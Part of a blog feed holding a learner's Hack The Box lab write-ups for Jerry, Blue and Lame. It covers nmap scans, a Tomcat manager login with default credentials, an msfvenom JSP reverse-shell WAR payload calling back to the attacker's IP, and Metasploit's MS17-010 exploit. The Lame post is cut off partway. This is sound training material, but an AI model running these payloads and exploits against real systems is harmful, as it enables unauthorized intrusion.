<p>I was able to solve this box today on my own without relying on a walkthrough, following yesterday&rsquo;s success with the box named <strong><em>Blue</em></strong>. I feel like the hard work that I have put in over the past couple of months is finally paying off. I am so happy :)</p>
<hr>
<h4 id="nmap-scan">nmap scan</h4>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="directory-busting-with-gobuster">directory busting with gobuster</h4>
<p><code>gobuster dir -u http://10.10.10.95:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>
<img src="image-5.png#center" alt="alt text"></p>
<br>
<p><em><strong>http://10.10.10.95:8080/docs</strong></em>
<img src="image-3.png#center" alt="alt text"></p>
<br>
<p><em><strong>http://10.10.10.95:8080/example</strong></em>
<img src="image-4.png#center" alt="alt text"></p>
<br>
<p><em><strong>http://10.10.10.95:8080/manager</strong></em>
<img src="image-6.png#center" alt="alt text"></p>
<br>
<p>After few tries of default credentials, it automatically redirected me to <strong><em>manager/html</em></strong> page and the second line listed the username <strong><em>tomcat</em></strong> and the password <strong><em>s3cret</em></strong> so I tried the credentials, though I was skeptical.
<img src="image-7.png#center" alt="alt text">
<img src="image-8.png#center" alt="alt text"></p>
<br>
<p>Contrary to my doubts, the username and password I tried hit the mark and directed me to <strong><em>Tomcat Web Application Manager</em></strong>.
<img src="image-9.png#center" alt="alt text"></p>
<br>
<p>After scrolling down a bit, I found a section (<strong><em>WAR file to deploy</em></strong>.) where I could upload a file. As soon as I saw this functionality, I thought of a solution where I could generate a payload, run it on the server, and finally pop the reverse shell to gain access.
<img src="image-10.png#center" alt="alt text"></p>
<br>
<h4 id="generating-payload">Generating payload</h4>
<p>Since we need to upload a <strong>.war</strong> reverse shell, I refered to the <strong><em>Reverse Shell Cheatsheet</em></strong> from the famous <strong><em>PayloadsAllTheThings</em></strong> github.</p>
<p><img src="image-11.png#center" alt="alt text"></p>
<p>The full command to generate the shell looks like this:</p>
<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f war &gt; reverse.war strings reverse.war</code></p>
<br>
<p>Uploaded the generated payload.
<img src="image-12.png#center" alt="alt text"></p>
<br>
<p>After uploading the payload and clicking the <strong>Deploy</strong> button, a new path named <strong><em>reverse</em></strong> appeared under the Applications section for the payload I created.
<img src="image-13.png#center" alt="alt text"></p>
<br>
<p>Before navigating to the new path to run the payload, I needed to set up a listener to listen for the port. Then, I successfully gained the shell.
<img src="image-15.png#center" alt="alt text"></p>
<br>
<p>After spending some time exploring the directories, I finally found the <strong><em>flags</em></strong> directory, in which included a text file called <strong><em>2 for the price of 1.txt</em></strong> and it contained both the user flag and the root flag.
<img src="image-16.png#center" alt="alt text"></p>
<br>
<p><img src="image-17.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Blue</title>
      <link>http://localhost:1313/htb-blue/</link>
      <pubDate>Tue, 06 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-blue/</guid>
      <description>This is my first post in a week, not because I was procastinating or slacking off, but because I was taking time to watch pentesting lectures to strengthen my foundational knowledge. I&amp;rsquo;ve alwas felt my foundation wa a bit weak. After watching some videos, I tackled this box, one of the easy-level challenges they recommended. I&amp;rsquo;m proud to say that, for the first time, I solved it without any help from a walkthrough.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img width="400px"src="./giphy.gif"></div>
<p>This is my first post in a week, not because I was procastinating or slacking off, but because I was taking time to watch pentesting lectures to strengthen my foundational knowledge. I&rsquo;ve alwas felt my foundation wa a bit weak. After watching some videos, I tackled this box, one of the easy-level challenges they recommended. I&rsquo;m proud to say that, for the first time, I solved it without any help from a walkthrough. Even though it was a straightforward box, solving it on my own is really satisfying. I know there&rsquo;s still a lot of room for improvement, especially in writing better write-ups but still, I&rsquo;m definitely making progress!</p>
<hr>
<br>
<p>As always, I started the enumeration phase by scanning ports with <strong><em>nmap</em></strong>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#6c7086;font-style:italic"># Nmap 7.94SVN scan initiated Tue Aug  6 23:39:01 2024 as: nmap -T4 -A --min-rate 3000 -p- -oA output 10.10.10.40</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.10.10.40
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0084s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Not shown: <span style="color:#fab387">65526</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>PORT      STATE SERVICE      VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>445/tcp   open  microsoft-ds Windows <span style="color:#fab387">7</span> Professional <span style="color:#fab387">7601</span> Service Pack <span style="color:#fab387">1</span> microsoft-ds <span style="color:#89dceb;font-weight:bold">(</span>workgroup: WORKGROUP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>49155/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>49156/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>49157/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>No exact OS matches <span style="color:#cba6f7">for</span> host <span style="color:#89dceb;font-weight:bold">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>TCP/IP fingerprint:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>OS:SCAN<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">V</span><span style="color:#89dceb;font-weight:bold">=</span>7.94SVN%E<span style="color:#89dceb;font-weight:bold">=</span>4%D<span style="color:#89dceb;font-weight:bold">=</span>8/6%OT<span style="color:#89dceb;font-weight:bold">=</span>135%CT<span style="color:#89dceb;font-weight:bold">=</span>1%CU<span style="color:#89dceb;font-weight:bold">=</span>31869%PV<span style="color:#89dceb;font-weight:bold">=</span>Y%DS<span style="color:#89dceb;font-weight:bold">=</span>2%DC<span style="color:#89dceb;font-weight:bold">=</span>T%G<span style="color:#89dceb;font-weight:bold">=</span>Y%TM<span style="color:#89dceb;font-weight:bold">=</span>66B2
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>OS:FAC2%P<span style="color:#89dceb;font-weight:bold">=</span>x86_64-pc-linux-gnu<span style="color:#89dceb;font-weight:bold">)</span>SEQ<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">SP</span><span style="color:#89dceb;font-weight:bold">=</span>107%GCD<span style="color:#89dceb;font-weight:bold">=</span>1%ISR<span style="color:#89dceb;font-weight:bold">=</span>107%TI<span style="color:#89dceb;font-weight:bold">=</span>I%CI<span style="color:#89dceb;font-weight:bold">=</span>I%II<span style="color:#89dceb;font-weight:bold">=</span>I%SS<span style="color:#89dceb;font-weight:bold">=</span>S%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>OS:TS<span style="color:#89dceb;font-weight:bold">=</span>7<span style="color:#89dceb;font-weight:bold">)</span>OPS<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">O1</span><span style="color:#89dceb;font-weight:bold">=</span>M53CNW8ST11%O2<span style="color:#89dceb;font-weight:bold">=</span>M53CNW8ST11%O3<span style="color:#89dceb;font-weight:bold">=</span>M53CNW8NNT11%O4<span style="color:#89dceb;font-weight:bold">=</span>M53CNW8ST11%O5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>OS:<span style="color:#89dceb;font-weight:bold">=</span>M53CNW8ST11%O6<span style="color:#89dceb;font-weight:bold">=</span>M53CST11<span style="color:#89dceb;font-weight:bold">)</span>WIN<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">W1</span><span style="color:#89dceb;font-weight:bold">=</span>2000%W2<span style="color:#89dceb;font-weight:bold">=</span>2000%W3<span style="color:#89dceb;font-weight:bold">=</span>2000%W4<span style="color:#89dceb;font-weight:bold">=</span>2000%W5<span style="color:#89dceb;font-weight:bold">=</span>2000%W6<span style="color:#89dceb;font-weight:bold">=</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>OS:2000<span style="color:#89dceb;font-weight:bold">)</span>ECN<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%W<span style="color:#89dceb;font-weight:bold">=</span>2000%O<span style="color:#89dceb;font-weight:bold">=</span>M53CNW8NNS%CC<span style="color:#89dceb;font-weight:bold">=</span>N%Q<span style="color:#89dceb;font-weight:bold">=)</span>T1<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%S<span style="color:#89dceb;font-weight:bold">=</span>O%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>OS:A<span style="color:#89dceb;font-weight:bold">=</span>S+%F<span style="color:#89dceb;font-weight:bold">=</span>AS%RD<span style="color:#89dceb;font-weight:bold">=</span>0%Q<span style="color:#89dceb;font-weight:bold">=)</span>T2<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%W<span style="color:#89dceb;font-weight:bold">=</span>0%S<span style="color:#89dceb;font-weight:bold">=</span>Z%A<span style="color:#89dceb;font-weight:bold">=</span>S%F<span style="color:#89dceb;font-weight:bold">=</span>AR%O<span style="color:#89dceb;font-weight:bold">=</span>%RD<span style="color:#89dceb;font-weight:bold">=</span>0%Q<span style="color:#89dceb;font-weight:bold">=)</span>T3<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>OS:<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%W<span style="color:#89dceb;font-weight:bold">=</span>0%S<span style="color:#89dceb;font-weight:bold">=</span>Z%A<span style="color:#89dceb;font-weight:bold">=</span>O%F<span style="color:#89dceb;font-weight:bold">=</span>AR%O<span style="color:#89dceb;font-weight:bold">=</span>%RD<span style="color:#89dceb;font-weight:bold">=</span>0%Q<span style="color:#89dceb;font-weight:bold">=)</span>T4<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%W<span style="color:#89dceb;font-weight:bold">=</span>0%S<span style="color:#89dceb;font-weight:bold">=</span>A%A<span style="color:#89dceb;font-weight:bold">=</span>O%F<span style="color:#89dceb;font-weight:bold">=</span>R%O<span style="color:#89dceb;font-weight:bold">=</span>%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>OS:RD<span style="color:#89dceb;font-weight:bold">=</span>0%Q<span style="color:#89dceb;font-weight:bold">=)</span>T5<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%W<span style="color:#89dceb;font-weight:bold">=</span>0%S<span style="color:#89dceb;font-weight:bold">=</span>Z%A<span style="color:#89dceb;font-weight:bold">=</span>S+%F<span style="color:#89dceb;font-weight:bold">=</span>AR%O<span style="color:#89dceb;font-weight:bold">=</span>%RD<span style="color:#89dceb;font-weight:bold">=</span>0%Q<span style="color:#89dceb;font-weight:bold">=)</span>T6<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%W
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>OS:<span style="color:#89dceb;font-weight:bold">=</span>0%S<span style="color:#89dceb;font-weight:bold">=</span>A%A<span style="color:#89dceb;font-weight:bold">=</span>O%F<span style="color:#89dceb;font-weight:bold">=</span>R%O<span style="color:#89dceb;font-weight:bold">=</span>%RD<span style="color:#89dceb;font-weight:bold">=</span>0%Q<span style="color:#89dceb;font-weight:bold">=)</span>T7<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>Y%T<span style="color:#89dceb;font-weight:bold">=</span>80%W<span style="color:#89dceb;font-weight:bold">=</span>0%S<span style="color:#89dceb;font-weight:bold">=</span>Z%A<span style="color:#89dceb;font-weight:bold">=</span>S+%F<span style="color:#89dceb;font-weight:bold">=</span>AR%O<span style="color:#89dceb;font-weight:bold">=</span>%RD<span style="color:#89dceb;font-weight:bold">=</span>0%Q<span style="color:#89dceb;font-weight:bold">=)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>OS:U1<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%DF<span style="color:#89dceb;font-weight:bold">=</span>N%T<span style="color:#89dceb;font-weight:bold">=</span>80%IPL<span style="color:#89dceb;font-weight:bold">=</span>164%UN<span style="color:#89dceb;font-weight:bold">=</span>0%RIPL<span style="color:#89dceb;font-weight:bold">=</span>G%RID<span style="color:#89dceb;font-weight:bold">=</span>G%RIPCK<span style="color:#89dceb;font-weight:bold">=</span>G%RUCK<span style="color:#89dceb;font-weight:bold">=</span>G%RUD<span style="color:#89dceb;font-weight:bold">=</span>G<span style="color:#89dceb;font-weight:bold">)</span>IE<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">R</span><span style="color:#89dceb;font-weight:bold">=</span>Y%D
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>OS:FI<span style="color:#89dceb;font-weight:bold">=</span>N%T<span style="color:#89dceb;font-weight:bold">=</span>80%CD<span style="color:#89dceb;font-weight:bold">=</span>Z<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>Network Distance: <span style="color:#fab387">2</span> hops
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>Host script results:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0s
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>| smb2-time:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>|   date: 2024-08-07T04:40:29
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>|_  start_date: 2024-08-07T04:29:18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>| smb-security-mode:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>|   account_used: guest
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span>|   authentication_level: user
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>|_  message_signing: disabled <span style="color:#89dceb;font-weight:bold">(</span>dangerous, but default<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>| smb-os-discovery:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>|   OS: Windows <span style="color:#fab387">7</span> Professional <span style="color:#fab387">7601</span> Service Pack <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">(</span>Windows <span style="color:#fab387">7</span> Professional 6.1<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">45</span><span>|   Computer name: haris-PC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">46</span><span>|   NetBIOS computer name: HARIS-PC<span style="color:#89b4fa">\x</span><span style="color:#fab387">00</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">47</span><span>|   Workgroup: WORKGROUP<span style="color:#89b4fa">\x</span><span style="color:#fab387">00</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">48</span><span>|_  System time: 2024-08-07T05:40:30+01:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">49</span><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">50</span><span>|   2:1:0:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">51</span><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">52</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">53</span><span>TRACEROUTE <span style="color:#89dceb;font-weight:bold">(</span>using port 22/tcp<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">54</span><span>HOP RTT     ADDRESS
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">55</span><span><span style="color:#fab387">1</span>   8.08 ms 10.10.14.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">56</span><span><span style="color:#fab387">2</span>   8.47 ms 10.10.10.40
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">57</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">58</span><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">59</span><span><span style="color:#6c7086;font-style:italic"># Nmap done at Tue Aug  6 23:40:34 2024 -- 1 IP address (1 host up) scanned in 93.01 seconds</span></span></span></code></pre></div>
<br>
<p>Since we know the target host is running the smb server, I tried the following command <code>smbclient -L \\\\10.10.10.40\\</code> to list the shares
<img src="image.png#center" alt="alt text"></p>
<br>
<p>Anonymous login was failed with every share but the <strong><em>Users</em></strong> share. I spent time looking around inside the share but there wasn&rsquo;t any useful information.
<img src="image-1.png#center" alt="alt text"></p>
<br>
<p>While exploring the <strong><em>Users</em></strong> share, ran another nmap script to find if there&rsquo;s any smb vulnerabilities. The scan found one vulnerability <strong>CVE-2017-0143</strong> also known as <strong>ms17-010</strong>.
<img src="image-2.png#center" alt="alt text"></p>
<br>
<p>To exploit the found vulnerability, I came to <strong><em>msfconsole</em></strong> and searched for <strong>ms17-010</strong>.
<img src="image-3.png#center" alt="alt text"></p>
<br>
<p>Configure options of exploit. set <strong>RHOSTS</strong> to 10.10.10.40 and <strong>LHOST</strong> to 10.10.14.15
<img src="image-4.png#center" alt="alt text"></p>
<br>
<p>Successfully got the shell!
<img src="image-5.png#center" alt="alt text"></p>
<br>
<p>From the user, Haris&rsquo; desktop, the user flag could be found.
<img src="image-6.png#center" alt="alt text"></p>
<br>
<p>Moved up to <strong>All Users</strong> directory, then to <strong>Administrator</strong> directory, there was the root.txt.
<img src="image-7.png#center" alt="alt text"></p>
<br>
<p><img src="image-8.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Lame</title>
      <link>http://localhost:1313/htb-lame/</link>
      <pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-lame/</guid>
      <description>This was my first time attempting a Hack The Box machine that&amp;rsquo;s not on the Starting Point. The machine offers two modes: Adventure Mode and Guided Mode. I first went for the Adventure Mode because I wanted to explore the box and solve it on my own. However, I hit a dead end and didn&amp;rsquo;t know how to proceed. So, I switched to Guided Mode, which was similar to the Starting Point boxes.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
<p>This was my first time attempting a Hack The Box machine that&rsquo;s not on the Starting Point. The machine offers two modes: <strong><em>Adventure Mode</em></strong> and <strong><em>Guided Mode</em></strong>. I first went for the Adventure Mode because I wanted to explore the box and solve it on my own. However, I hit a dead end and didn&rsquo;t know how to proceed. So, I switched to Guided Mode, which was similar to the Starting Point boxes. With the help of Guided Mode and the questions, I was able to solve the box easily. Looking back, it wasn&rsquo;t really that hard, but I felt stuck and had no clude what to do next. It takes a lot of trial and error to get better at this, and I&rsquo;ve improved a lot over the past few months. I&rsquo;m proud of my progress, but I know I have a long way to go. In the end, it&rsquo;s so much fun, and that&rsquo;s what really matters.</p>
<hr>
<h4 id="how-many-of-the-nmap-top-1000-tcp-ports-are-open-on-the-remote-host">How many of the nmap top 1000 TCP ports are open on the remote host?</h4>






<pre tabindex="0"><code>4</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>
<p>I scanned all 65535 ports so I found 5 open ports but the question was asking for the top 1000 TCP ports. Excluding the port 3632, the answer should be 4.</p>
<br>
<h4 id="what-version-of-vsftpd-is-running-on-lame">What version of VSFTPd is running on Lame?</h4>






<pre tabindex="0"><code>2.3.4</code></pre>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="there-is-a-famous-backdoor-in-vsftpd-version-234-and-a-metasploit-module-to-exploit-it-doe-sthat-exploit-work-here">There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Doe sthat exploit work here?</h4>






<pre tabindex="0"><code>no</code></pre>
<p>I&rsquo;ve set up the required <code>RHOSTS</code> and <code>RPORT</code>, then ran the exploit but didn&rsquo;t seem to work.</p>
<p><img src="image-6.png#center" alt="alt text">
<img src="image-7.png#center" alt="alt text">
<img src="image-8.png#center" alt="alt text"></p>
<br>
<h4 id="what-version-of-samba-is-running-on-lame-give-the-numbers-up-to-but-not-including--debian">What version of Samba is running on Lame? Give the numbers up to but not including &ldquo;-Debian&rdquo;.</h4>






<pre tabindex="0"><code>3.0.20</code></pre>
<p>From the nmap scan, we can see that it&rsquo;s running the version 3.0.20 of Samba.</p>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
